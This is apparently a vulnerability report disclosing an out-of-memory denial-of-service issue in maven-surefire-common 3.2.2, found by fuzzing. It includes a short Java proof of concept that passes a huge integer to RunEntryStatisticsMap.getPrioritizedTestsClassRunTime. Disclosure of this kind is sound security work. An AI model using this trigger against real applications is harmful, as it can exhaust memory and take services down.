When I test the latest version(3.2.2) of maven-surefire-common by CIFuzz，a OOM security issue was found, it caused when use a big number, may cause denial of service issues in applications via the follow code:

pom
```
<dependency>
   <groupId>org.apache.maven.surefire</groupId>
   <artifactId>maven-surefire-common</artifactId>
   <version>3.2.2</version>
</dependency>
```
code
```
import org.apache.maven.surefire.api.runorder.RunEntryStatisticsMap;

import java.util.ArrayList;

public class MavenSurefire_OOM {

    public static void main(String[] args) {
        try {
            RunEntryStatisticsMap runEntryStatisticsMap = new RunEntryStatisticsMap();
            runEntryStatisticsMap.getPrioritizedTestsClassRunTime(new ArrayList(), 1832742252);
        } catch (Exception e) {
        }
    }
}
```
![image](https://github.com/Alex111998/Vuln/assets/127834723/fecb6a8c-0364-4694-9980-fa89226e139f)
